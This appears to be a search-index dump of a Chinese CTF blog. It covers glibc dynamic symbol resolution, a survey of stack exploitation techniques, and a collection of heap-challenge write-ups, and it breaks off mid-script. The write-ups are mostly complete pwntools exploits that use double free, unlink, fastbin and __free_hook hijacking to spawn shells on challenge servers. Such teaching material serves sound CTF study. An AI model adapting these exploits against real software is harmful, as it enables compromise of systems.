"date": "2022-09-15 16:20:00 +0800", "snippet": "_dl_runtime_resolve位于loader中，用于解析外部函数符号的函数，解析完成后会直接执行解析的函数。被PLT[0]调用时需要传入link_map和reloc_arg参数，紧接着将这些参数传入_dl_fixup进行解析。# glibc/sysdeps/i386/dl-trampoline.S_dl_runtime_resolve:\tcfi_adjust_cfa_offset (8)\t_CET_ENDBR\tpushl %eax\t\t# Preserve registers otherwise clobbered.\tcfi_adjust_cfa_offset (4)\tpushl %ecx\tcfi_adjust_cfa_offset (4)\tpushl %edx\tcfi_adjust_cfa_offset (4)\tmovl 16(%esp), %edx\t# Copy args pushed by PLT in register. Note\tmovl 12(%esp), %eax\t# that `fixup' takes its parameters in regs.\tcall _dl_fixup\t\t# Call resolver.\tpopl %edx\t\t# Get register content back.\tcfi_adjust_cfa_offset (-4)\tmovl (%esp), %ecx\tmovl %eax, (%esp)\t# Store the function address.\tmovl 4(%esp), %eax\tret $12\t\t\t# Jump to function address.link_map动态链接器映射到内存中时，首先会处理自身的重定位，因为链接器本身就是一个共享库。接着会查看可执行程序的动态段并查找DT_NEEDED参数，该参数保存了指向所需要的共享库的字符串或者路径名。当一个共享库被映射到内存之后，链接器会获取到共享库的动态段，并将共享库的符号表添加到符号链中，符号链存储了所有映射到内存中的共享库的符号表。链接器为每个共享库生成一个link_map结构的条目，并将其存到一个链表中// /usr/include/link.hstruct link_map { /* These first few members are part of the protocol with the debugger. This is the same format used in SVR4. */ ElfW(Addr) l_addr;\t\t/* Difference between the address in the ELF\t\t\t\t file and the addresses in memory. */ char *l_name;\t\t/* Absolute file name object was found in. */ ElfW(Dyn) *l_ld;\t\t/* Dynamic section of the shared object. */ struct link_map *l_next, *l_prev; /* Chain of loaded objects. */ };_dl_fixup 通过参数reloc_arg计算.rel.plt对应的Elf32_Rel结构体。 通过reloc-&gt;r_info找到.dynsym中对应的Elf32_Sym结构体 通过sym-&gt;st_name+dynstr找到符号表字符串，通过_dl_lookup_symbol寻找libc基地址并返回给result。DL_FIXUP_MAKE_VALUE得到的value为libc基址加上要解析函数的偏移地址即实际地址 最后把value写回相应的GOT表项(*(reloc-&gt;r_offset))中// glibc/elf/dl-runtime.cDL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t struct link_map *l, ElfW(Word) reloc_arg){ const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);// 1. 通过参数reloc_arg计算.rel.plt对应的Elf32_Rel结构体// JMPREL即.rel.plt const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL])\t\t + reloc_offset (pltgot, reloc_arg));// 2. 找到.dynsym中对应的Elf32_Sym结构体 const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; const ElfW(Sym) *refsym = sym; void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we're really looking at a PLT relocation. */ assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) { const struct r_found_version *version = NULL; if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t{\t const ElfW(Half) *vernum =\t (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t version = &amp;l-&gt;l_versions[ndx];\t if (version-&gt;hash == 0)\t version = NULL;\t} /* We need to keep the scope around so do some locking. This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P)\t{\t THREAD_GSCOPE_SET_FLAG ();\t flags |= DL_LOOKUP_GSCOPE_LOCK;\t}// 3. 通过_dl_lookup_symbol寻找libc基地址并返回给result// sym-&gt;st_name即函数名 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG (); /* Currently result contains the base load address (or link map)\t of the object that defines sym. Now add in the symbol\t offset. */// 3. libc基址加上要解析函数的偏移地址即实际地址 value = DL_FIXUP_MAKE_VALUE (result,\t\t\t\t SYMBOL_ADDRESS (result, sym, false)); } else { /* We already found the symbol. The module (and therefore its load\t address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; } /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));... /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value;// 4. 把value写回相应的GOT表项(*(reloc-&gt;r_offset))中 return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);}dl_fixup调用过程reference _dl_runtime_resolve dl-resolve浅析" }, { "title": "栈利用总结", "url": "/posts/%E6%A0%88%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/", "categories": "CTF, PWN", "tags": "stack", "date": "2022-09-13 14:11:00 +0800", "snippet": "概述 概念提出于美国空军发表的论文《Computer Security Technology Planning Study》(1972) Morris蠕虫(1988) 发表在Phrack杂志上的利用技术文章《Smashing the Stack For Fun and Profit》(1996)ret2text程序本身存在get_shell的本地函数后门，则栈溢出后直接返回该处即可ret2syscall使用ROPgadget等工具构造系统调用，注意32位和64位系统调用的区别ret2shellcode程序向可执行的bss段写入时，可以在此加入shellcode。具体可以用pwntools的asm模块构造系统调用，也可以用shellcraft模块直接生成。ret2libc发生栈溢出时通过返回libc中的system函数提权。libc中存有/bin/sh字符串，在知道加载基地址的情况下可以利用。通过下述命令可以查看当前libc加载情况pwndbg&gt; info proc mappingsprocess 1147Mapped address spaces: Start Addr End Addr Size Offset objfile 0x555555554000 0x555555555000 0x1000 0x0 /root/pwn-workplace/how2heap/glibc_2.23/fastbin_duppwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555555000 r--p 1000 0 /root/pwn-workplace/how2heap/glibc_2.23/fastbin_dup通过下述命令获取函数和字符串偏移地址pwndbg&gt; p system$6 = {int (const char *)} 0x7ffff7e1b290 &lt;__libc_system&gt;pwndbg&gt; p exit$7 = {void (int)} 0x7ffff7e0fa40 &lt;__GI_exit&gt;pwndbg&gt; find /b 0x7ffff7dc9000, 0x7ffff7fb7000, '/', 'b', 'i', 'n', '/', 's', 'h', 00x7ffff7f7d5bd1 pattern found.root@HeFeng:~/pwn-workplace/how2heap/glibc_2.23# ldd fastbin_dup linux-vdso.so.1 (0x00007ffffe1f7000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6e2b375000) /lib64/ld-linux-x86-64.so.2 (0x00007f6e2b57b000)root@HeFeng:~/pwn-workplace/how2heap/glibc_2.23# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system 237: 0000000000153ae0 103 FUNC GLOBAL DEFAULT 15 svcerr_systemerr@@GLIBC_2.2.5 619: 0000000000052290 45 FUNC GLOBAL DEFAULT 15 __libc_system@@GLIBC_PRIVATE 1430: 0000000000052290 45 FUNC WEAK DEFAULT 15 system@@GLIBC_2.2.5root@HeFeng:~/pwn-workplace/how2heap/glibc_2.23# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep exit 108: 0000000000047190 21 FUNC GLOBAL DEFAULT 15 __cxa_at_quick_exit@@GLIBC_2.10 135: 0000000000046a40 32 FUNC GLOBAL DEFAULT 15 exit@@GLIBC_2.2.5 446: 00000000000471b0 206 FUNC GLOBAL DEFAULT 15 __cxa_thread_atexit_impl@@GLIBC_2.18root@HeFeng:~/pwn-workplace/how2heap/glibc_2.23# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh 1b45bd /bin/shrop通过拼接ret指令结尾的代码片段来实现某些功能的技术称为ROP，以ret指令结尾的小段代码片段称为ROP gadget，为实现某一功能拼接而成的多个ROP gadget称为ROP Chain，在栈上填充的用于执行ROP链的数据称为ROP Payload。ROP是ret2libc的扩展，ret2libc是ROP的特殊情况。除此之外还有JOP(Jump Oriented Programming)和COP(Call Oriented Programming)使用pwntools的rop模块可以简单的构造ret2libc的rop链，需提前将libc.address设置为已知的偏移量。Return to dl_runtime_resolve适用于libc不可知的情况 控制EIP为PLT[0]，只需传递一个index_arg参数 控制index_arg的大小，使reloc的位置落在可控地址内 伪造reloc的内容，使sym落在可控地址内 伪造sym的内容，使name落在可控地址内 伪造name为任意库函数名称，如systemret2plt动态共享库的地址随机化保护开始，则无法知道libc地址，程序中已经引用的动态库函数，可以直接通过PLT调用。ret2got修改GOT表内容指向system函数，直接通过调用已导入函数实现控制ret2user驱动通过_copy_from_user将用户输入的数据最终读入到了内核栈中的buffer，由于没有限制长度，造成了溢出溢出后直接覆盖返回地址为用户态调用commit_cres(prepare_kernel_cred(0));函数进行提权，然后通过iretq指令从内核态返回到用户态，从而get shell伪造iretq 在bss段伪造iretq 在内核栈上伪造Blind Return Oriented Programming(BROP)条件 程序存在已知的stack overflow漏洞 服务器进程在crash之后复活，但复活的进程不会re-rand，例如nginx，MySQL，Apache，OpenSSH，Samba思路 判断栈溢出的长度 逐字节爆破Canary 寻找stop gadget 寻找useful gadget 寻找可利用PLT表项 利用PLT中puts或其他函数dump信息stop gadget程序ret到无限循环的代码段，攻击者能够一直保持连接状态，通过爆破返回地址不会造成crash的即为stop gadgetuseful gadget寻找有6个pop的代码段可以通过如图所示的栈布局爆破，只有含有6个pop的代码段不会crash寻找可用PLT表项程序的plt表具有比较规整的结构，每一个plt表项都是16字节，而且在6字节偏移处是对应函数的解析路径如果攻击者发现好多条连续的16字节对齐的地址都不会造成crash，且这些地址加6得到的地址也不会造成crash则很有可能是PLT表未开启PIE的情况下0x400000为ELF头部，内容为”\\x7fELF”通过构造栈空间使用爆破得到的plt表项传入0x400000判断是否为puts函数Sigreturn Oriented Programming(SROP)signal机制是类unix系统中进程之间相互传递信息的一种方法。一般称为软中断，一般可以通过系统调用kill来发送传中断信号内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及signal和指向sigreturn的系统调用地址。ucontext以及siginfo这一段称为Signal Frame，这一部分是在用户进程的地址空间。之后会跳转到注册过的signal handler中处理相应的signal，当signal handler执行完后便会执行sigreturn代码。整个过程中内核主要为进程保存上下文并且恢复上下文，但Signal Frame被保存在用户的地址空间中，用户是可以读写的。Stack Pivot通过一个修改esp寄存器的gadget来改变栈的位置场景 溢出长度较短，不够ROP 溢出载荷以0结尾，而gadget地址以0开头 在泄露地址后，需要执行一个新的ROP链add esp将esp加上一个固定值的gadget称为add esppop ebp ret + leave retpop ebp;ret; + leave;ret两个gadget组合可以将esp改成任意值pop ebp;ret;可以将ebp改成任意值eave = mov esp,ebp;pop ebp;因此ebp会存入esp，esp可任意控制gadget__libc_csu_init只要x64调用了libc.so就会自带__libc_csu_init函数通过第二个函数写入r13，r14，r15，再用第一个函数写入rdx，rsi，edi中，并call [r12+rbx*8]调用libc_csu_init.text:00000000000011B0 loc_11B0: ; CODE XREF: __libc_csu_init+54↓j.text:00000000000011B0 4C 89 F2 mov rdx, r14.text:00000000000011B3 4C 89 EE mov rsi, r13.text:00000000000011B6 44 89 E7 mov edi, r12d.text:00000000000011B9 41 FF 14 DF call ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8].text:00000000000011B9.text:00000000000011BD 48 83 C3 01 add rbx, 1.text:00000000000011C1 48 39 DD cmp rbp, rbx.text:00000000000011C4 75 EA jnz short loc_11B0.text:00000000000011C4.text:00000000000011C6.text:00000000000011C6 loc_11C6: ; CODE XREF: __libc_csu_init+35↑j.text:00000000000011C6 48 83 C4 08 add rsp, 8.text:00000000000011CA 5B pop rbx.text:00000000000011CB 5D pop rbp.text:00000000000011CC 41 5C pop r12.text:00000000000011CE 41 5D pop r13.text:00000000000011D0 41 5E pop r14.text:00000000000011D2 41 5F pop r15.text:00000000000011D4 C3 retn.text:00000000000011D4 ; } // starts at 1170.text:00000000000011D4.text:00000000000011D4 __libc_csu_init endp原__libc_csu_initgdb-peda$ x/5i 0x000000000040061a 0x40061a &lt;__libc_csu_init+122&gt;: mov r14,QWORD PTR [rsp+0x28] 0x40061f &lt;__libc_csu_init+127&gt;: mov r15,QWORD PTR [rsp+0x30] 0x400624 &lt;__libc_csu_init+132&gt;: add rsp,0x38 0x400628 &lt;__libc_csu_init+136&gt;: ret偏移修改esigdb-peda$ x/5i 0x000000000040061b 0x40061b &lt;__libc_csu_init+123&gt;: mov esi,DWORD PTR [rsp+0x28] 0x40061f &lt;__libc_csu_init+127&gt;: mov r15,QWORD PTR [rsp+0x30] 0x400624 &lt;__libc_csu_init+132&gt;: add rsp,0x38 0x400628 &lt;__libc_csu_init+136&gt;: ret 0x400629: nop DWORD PTR [rax+0x0]偏移修改edigdb-peda$ x/5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+128&gt;: mov edi,DWORD PTR [rsp+0x30] 0x400624 &lt;__libc_csu_init+132&gt;: add rsp,0x38 0x400628 &lt;__libc_csu_init+136&gt;: ret 0x400629: nop DWORD PTR [rax+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz ret_dl_runtime_resolve0x7ffff7def200 &lt;_dl_runtime_resolve&gt;: sub rsp,0x380x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;: mov QWORD PTR [rsp],rax0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;: mov QWORD PTR [rsp+0x8],rcx0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;: mov QWORD PTR [rsp+0x10],rdx0x7ffff7def212 &lt;_dl_runtime_resolve+18&gt;: mov QWORD PTR [rsp+0x18],rsi0x7ffff7def217 &lt;_dl_runtime_resolve+23&gt;: mov QWORD PTR [rsp+0x20],rdi0x7ffff7def21c &lt;_dl_runtime_resolve+28&gt;: mov QWORD PTR [rsp+0x28],r80x7ffff7def221 &lt;_dl_runtime_resolve+33&gt;: mov QWORD PTR [rsp+0x30],r90x7ffff7def226 &lt;_dl_runtime_resolve+38&gt;: mov rsi,QWORD PTR [rsp+0x40]0x7ffff7def22b &lt;_dl_runtime_resolve+43&gt;: mov rdi,QWORD PTR [rsp+0x38]0x7ffff7def230 &lt;_dl_runtime_resolve+48&gt;: call 0x7ffff7de8680&lt;_dl_fixup&gt;0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;: mov r11,rax0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;: mov r9,QWORD PTR [rsp+0x30]0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;: mov r8,QWORD PTR [rsp+0x28]0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;: mov rdi,QWORD PTR [rsp+0x20]0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;: mov rsi,QWORD PTR [rsp+0x18]0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;: mov rdx,QWORD PTR [rsp+0x10]0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;: mov rcx,QWORD PTR [rsp+0x8]0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;: mov rax,QWORD PTR [rsp]0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;: add rsp,0x480x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;: jmp r11注意mov r11,rax和jmp r11，最后需要提前设定rax来返回pop rdi,ret0x400622:pop r15,ret的三字节指令(0x41 0x5F 0xC3)拆散看，会发现后两个字节组成了一组新的指令pop rdi,ret，可以用来控制第一个入参。pop rsi,ret0x400620:pop r14的两字节指令（0x41 0x5E）拆散，会发现后一个字节是单字节指令pop rsi，可以用来控制第二个入参。pop3 retpop ebx;pop esi;pop edi;ret;这种3个pop的gadget记为pop3 ret。reference Pwn从入门到放弃（四） dl-resolve浅析" }, { "title": "堆刷题小结", "url": "/posts/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%932/", "categories": "CTF, Exercise", "tags": "heap", "date": "2022-09-12 20:15:00 +0800", "snippet": "ACTF_2019_message(doubel free + free_hook attack)ACTF_2019_message简单的double free到message信息储存的区域，实现任意地址写，通过show泄露函数地址注意程序开启了full reloc，所以不能劫持got表，这里劫持__free_hookfrom pwn import *from LibcSearcher import *io = remote('192.168.135.133',12348)libc = ELF('./libc.so.6')elf = ELF('./ACTF_2019_message')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'def add(leng,content): io.recvuntil('choice: ') io.sendline('1') io.recvuntil('message:\\n') io.sendline(str(leng)) io.recvuntil('message:\\n') io.sendline(content)def delete(index): io.recvuntil('choice: ') io.sendline('2') io.recvuntil('delete:\\n') io.sendline(str(index))def edit(index,content): io.recvuntil('choice: ') io.sendline('3') io.recvuntil('edit:\\n') io.sendline(str(index)) io.recvuntil('message:\\n') io.send(content)def show(index): io.recvuntil('choice: ') io.sendline('4') io.recvuntil('display:\\n') io.sendline(str(index)) io.recvuntil('message: ')message_addr = 0x602060'''double free到这里的0号，由于内容为0x20，chunk的size为0x30才能通过检测，所以这里直接写入0x30'''add(0x30,'aaaa') # 0add(0x20,'bbbb') # 1add(0x20,'cccc') # 2delete(1)delete(2)delete(1)add(0x20,p64(message_addr-0x8)) # 3add(0x20,'/bin/sh') # 4 后面劫持free，这里预留/sh的字符串add(0x20,'eeee') # 5add(0x20,p64(elf.got['puts'])) # 6'''leak libc这里LibcSearcher出现了问题，由于是本地测试，直接用了本地libc'''show(0)puts_addr = io.recv(6).ljust(8,'\\x00')puts_addr = u64(puts_addr)obj = LibcSearcher('puts',puts_addr)#wrong with LibcSearcher in localbase_addr = puts_addr - libc.symbols['puts']#obj.dump('puts')sys_addr = base_addr + libc.symbols['system']#obj.dump('system')free_addr = base_addr + libc.symbols['__free_hook']#obj.dump('__free_hook')'''由于double free破坏了0x30 fastbin的结构，再add(0x20)会有问题，这里使用add(0x10)或者直接在4号写入'''#add(0x10,'/bin/sh\\x00') # 7 0x30 fastbin cant be used beacause of double free,try 0x20edit(6,p64(free_addr))edit(0,p64(sys_addr))delete(4)io.interactive()4-ReeHY-main(double free + unlink)# 4-ReeHY-mainsturct{\tint_32 nbytes;\tint_64 heap_ptr;\tint_64 isUsed;}int_32 size[5];int_64 a[10];a[0],a[2],a[4],a[6],a[8] -&gt; heap_ptr;a[1],a[3],a[5],a[7],a[9] -&gt; isUsed;存在double free漏洞，通过unlink修改a[4]指向自身附近，从而劫持所有a数组，指向任意地址，实现任意地址写伪造的chunk如下图所示，绕过unlink检查需要FD-&gt;bk == P&amp;&amp;BK-&gt;fd == P，让FD-&gt;bk和BK-&gt;fd都是存放heap的地方chunk0 malloc返回的ptr chunk1 malloc返回的pt| | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+| | |fake|fake|fake|fake| D | fake | fake | | | || | |prev|size| FD | BK | A | prev | size&amp;| | | || prev_size |size&amp;Flag|size| | | | T | size | flag | | | || | | | | | | A | | | | | || | | | | | | | | | | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+ |-------new_chunk0-------|释放chunk1绕过unlink后执行FD-&gt;bk = BK;BK-&gt;fd = FD;修改存放heap指针的地方指向heap-0x18from pwn import *from LibcSearcher import *elf = ELF('./4-ReeHY-main')context.os = 'linux'context.arch = 'amd64'context.log_level = 'debug'def add(_id,size,content):\tio.recvuntil('$ ')\tio.sendline('1')\tio.recvuntil('size\\n')\tio.sendline(str(size))\tio.recvuntil('cun\\n')\tio.sendline(str(_id))\tio.recvuntil('content\\n')\tio.sendline(content)def delete(_id):\tio.recvuntil('$ ')\tio.sendline('2')\tio.recvuntil('dele\\n')\tio.sendline(str(_id))def edit(_id,content):\tio.recvuntil('$ ')\tio.sendline('3')\tio.recvuntil('edit\\n')\tio.sendline(str(_id))\tio.recvuntil('content\\n')\tio.send(str(content))def init():\tio.recvuntil('name: \\n')\tio.sendline('name')io = remote('220.249.52.133',46328)#io = process('./4-ReeHY-main')heap_2_saved_addr = 0x602100init()add(0,0x200,\"/bin/sh\\x00\")add(1,0x200,'aaaa') # avoid padding struct_0 in payload2add(2,0x200,\"bbbb\")add(3,0x200,\"cccc\")delete(3)delete(2)payload = p64(0) + p64(512|1) + p64(heap_2_saved_addr-0x18) + p64(heap_2_saved_addr-0x10)payload += 'a'*(0x200-0x20) + p64(0x200) + p64(0x200)add(2,0x400,payload)delete(3) # unlink 1+2 -&gt; 1,[heap_2_saved_addr] = heap_2_saved_addr-0x18print 'unlink finished'payload2 = 'a'*0x18 + p64(elf.got['free']) + p64(1) + p64(elf.got['atoi']) + p64(1) + '\\n'edit(2,payload2) # [heap_2] = free_got [heap_3] = atoi_gotedit(2,p64(elf.plt['puts'])) # [free_got] = puts_plt if sendline, free's next got(puts) will be changed by 0adelete(3) # free -&gt; puts so now puts(atoi_got)print 'got-hacked finished'atoi_addr = u64(io.recv(6).ljust(8,'\\x00'))obj = LibcSearcher('atoi',atoi_addr) # ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)base_addr = atoi_addr - obj.dump('atoi')sys_addr = base_addr + obj.dump('system')edit(2,p64(sys_addr)) # free -&gt; systemdelete(0)io.interactive()mmutag(double free + fastbin attack)mmutag2020西湖论剑fastbin中直接double free伪造chunk至栈上，需要注意fake chunk的pre_size、size、fd字段的完整性from pwn import *io = remote('192.168.135.133',12345)elf = ELF('./mmutag')libc = ELF('./libc.so.6')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'def init(): io.recvuntil('name: \\n') io.sendline('aaaa') io.recvuntil('tag: ') p = io.recvuntil(':')[:-1] tar = int(p,16) return tardef add(idc,content): io.recvuntil('choise:\\n') io.sendline('1') io.recvuntil('id:\\n') io.sendline(str(idc)) io.recvuntil('content\\n') io.sendline(content)def delete(idc): io.recvuntil('choise:\\n') io.sendline('2') io.recvuntil('id:\\n') io.sendline(str(idc))def write_buf(content): io.recvuntil(\"choise:\\n\") io.sendline('3') sleep(0.5) io.sendline(content)def exit(): io.recvuntil(\"choise:\\n\") io.sendline('4')def getCanary(): io.recvuntil('choise:\\n') io.sendline('3') sleep(0.5) payload = 'a'*0x19 io.send(payload) io.recvuntil(payload) res = io.recv(7) res = '\\x00'+res res = u64(res) return res'''get canary and address of stack'''buf = init()io.recvuntil('choice:\\n\\n')io.sendline('2')canary = getCanary()'''get libc addr'''pop_rdi = 0x400d23main_addr = 0x400a99payload2 = p64(0) + p64(0x70|1) + p64(0) # fake pre_size and size and fd. fastbin size:0x10-0x80 -&gt; 0x68 =&gt; 0x70payload3 = 'a'*8 + p64(canary) + p64(0xdeadbeef)payload3 += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr)add(1,'aaaa')add(2,'bbbb')delete(1)delete(2)delete(1)add(3,p64(buf-0x40))add(4,'aaaa')add(5,'bbbb')write_buf(payload2) # fake chunk infoadd(6,payload3) # fake chunk in stack!!!exit()puts_addr = u64(io.recv(6)+'\\x00\\x00')base_addr = puts_addr - libc.symbols['puts']sys_addr = base_addr + libc.symbols['system']sh_addr = base_addr + next(libc.search('/bin/sh'))'''get shell'''payload4 = p64(0)+p64(0x70|1)+p64(0)payload5 = 'a'*0x8 + p64(canary) + p64(0xdeadbeef)payload5 += p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)delete(1)delete(2)delete(1)add(7,p64(buf-0x20))add(8,'bbbb')add(9,'cccc')write_buf(payload4)add(10,payload5)exit()io.interactive()note_service2(jmp short + shellcode)note_service2通过jmp short在间断的chunk上执行shellcode，通过下标溢出修改got表为chunk的地址from pwn import *io = remote(\"220.249.52.133\",43107)elf = ELF('./note-service2')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'def add(idc,content): io.recvuntil('choice&gt;&gt; ') io.sendline('1') io.recvuntil('index:') io.sendline(str(idc)) io.recvuntil('size:') io.sendline('8') io.recvuntil('content:') jmp = '\\xeb\\x19' # jmp short 0x19 io.send(content.ljust(5,asm('nop'))+jmp)def delete(idc): io.recvuntil('choice&gt;&gt; ') io.sendline('4') io.recvuntil('index:') io.sendline(str(idc))shellcode = shellcraft.sh()print shellcodepayload = ['xor rax,rax','xor rsi,rsi','xor edx,edx','mov eax,0x3b','syscall'] # call system after rdi saved '/bin/sh'hacked_index = (0x202060-0x2020a0)//8 # offset of got[atoi]add(0,'a'*5)add(1,asm(payload[0]))add(2,asm(payload[1]))add(3,asm(payload[2]))add(4,asm(payload[3]))add(5,asm(payload[4]))delete(0)add(hacked_index,'') # hack atoi point to our shellcode chunkio.interactive()heap(off by one + fastbin double free + free hook)heap不存在uaf漏洞，默认libc为2.23版本通过off by one漏洞制造double free的fastbin在main arena上伪造chunk，直接覆写top指针指向free_hook上方，之后通过malloc分割top chunk劫持free_hook指向system，完成利用在https://xz.aliyun.com/t/7020文中提供了先覆写fastbin再劫持top的方法小问题： sendline和send 释放一次，索引上限减一，大索引会无法释放from pwn import *context.log_level = 'debug'io = process('./heap')libc = ELF('./heap').libcdef add(size,strs):\tio.recvuntil('Choice :')\tio.sendline('1')\tio.recvuntil('size: ');\tio.sendline(str(size))\tio.recvuntil('data: ')\tio.send(strs)def delete(index):\tio.recvuntil('Choice :')\tio.sendline('2')\tio.recvuntil('delete: ')\tio.sendline(str(index))def show():\tio.recvuntil('Choice :')\tio.sendline('3')'''leak libc base'''add(0x100,'1') # 0add(0x68,'2') # 1delete(0) # unsorted binadd(0x100,'a'*8) # bk-&gt;unsorted binshow()libc_base = io.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')libc_base = u64(libc_base)libc.address=libc_base-0x3c4b20-88print 'libc: '+str(hex(libc.address))'''fastbin double free + off by one'''add(0x68,'3') # 2add(0x68,'4') # 3add(0x68,'5') # 4delete(1)add(0x68,'a'*0x68+'\\xe1') # 1 off by onedelete(2) # size = no.2+no.3add(0x68,'3') # 2add(0x68,'6') # 5 same to no.3delete(5)delete(4) # avoid double free checkdelete(3)io.recvall()gdb.attach(io)'''hack free hook'''add(0x68,p64(libc.sym['__malloc_hook']-0x23+0x20)) # 3add(0x68,'/bin/sh\\x00') # 4add(0x68,'6') # 5add(0x68,'\\x00'*(88-13+16)+p64(libc.sym['__free_hook']-0xb58)) # 6 fake chunk in main arenafor i in range(18): add(0x90,'aaa')add(0x90,'a'*8+p64(libc.sym['system']))delete(4)io.interactive()secret_of_my_heart(null by one + fastbin double free + free hook)secret_of_my_heartwp与heap题相似通过越位的0Byte让后面的0xf8大块误以为可以合并，且伪造prev_size使得合并时合法的unlink第一个0x80的块，至此总块之后用double free在main arena上伪造块，需要注意的是无法直接覆盖到top chunk，先劫持fastbin再伪造一个靠近top chunk的块后再劫持top chunk将top chunk指向free hook-0xb58处，通过malloc劫持free hook为systemflag在/home/secret_of_my_heart目录下小问题： main arena上伪造块的size为0x7f在64位机下可以绕过0x70的fastbin检查，所以fastbin double free需要在0x70的bin内展开 如果没有伪造prev_size，下一个块不能合法的合并，因为没有合法的unlink用的bk和fd 64位下chunk以16B对齐，有时候分配的chunk没有给prev_size字段，需要构造合理的sizefrom pwn import *io = remote('chall.pwnable.tw',10302)#io = process('./secret_of_my_heart')libc = ELF('./libc_64.so.6')#context.log_level = 'debug'# size&lt;=0x100 num[0~99]def add(size,name,strs):\tio.recvuntil('choice :')\tio.sendline('1')\tio.recvuntil('heart : ')\tio.sendline(str(size))\tio.recvuntil('heart :')\tio.send(name)\tio.recvuntil('heart :')\tio.send(strs)def delete(index):\tio.recvuntil('choice :')\tio.sendline('3')\tio.recvuntil('Index :')\tio.sendline(str(index))def show(index):\tio.recvuntil('choice :')\tio.sendline('2')\tio.recvuntil('Index :')\tio.sendline(str(index))def secret():\tio.recvuntil('choice :')\tio.sendline('4869')\tio.recvuntil('0x')\tptr_mmap = io.recvuntil('Good')[:-4]\tptr_mmap = int(ptr_mmap,16)\tprint 'ptr_mmap:' + hex(ptr_mmap)\treturn ptr_mmap'''leak heap解题时没有用'''add(10,'a'*32,'b'*10) # 0show(0)io.recvuntil('a'*32)ptr_chunk = u64(io.recvuntil('\\x0aSecret')[:-7].ljust(8,'\\x00'))print 'ptr_chunk:' + hex(ptr_chunk)'''overlap chunk'''add(0x80,'name1','content') # 1add(0x68,'name2','content') # 2add(0xf8,'name3','content') # 3add(0x68,'name4','content') # 4add(0x80,'name5','/bin/sh\\x00') # 5delete(1)delete(2)add(0x68,'name1','a'*0x60+p64(0x60+0x10+0x80+0x10)) # 1delete(3) # free chunk size = chunk 1 + chunk 2 + chunk 3add(0x80,'name2','a'*0x80) # 2show(1)io.recvuntil('Secret : ')libc_base = u64(io.recvuntil('\\x0a')[:-1].ljust(8,'\\x00'))libc.address = libc_base-88-0x3c3b20print 'libc_base:' + hex(libc_base)add(0x68,'name3','content') # 3'''double free'''delete(1)delete(4)delete(3)add(0x68,'name1',p64(libc.sym['__malloc_hook']-0x23+0x18)) # 1add(0x68,'name3','content') # 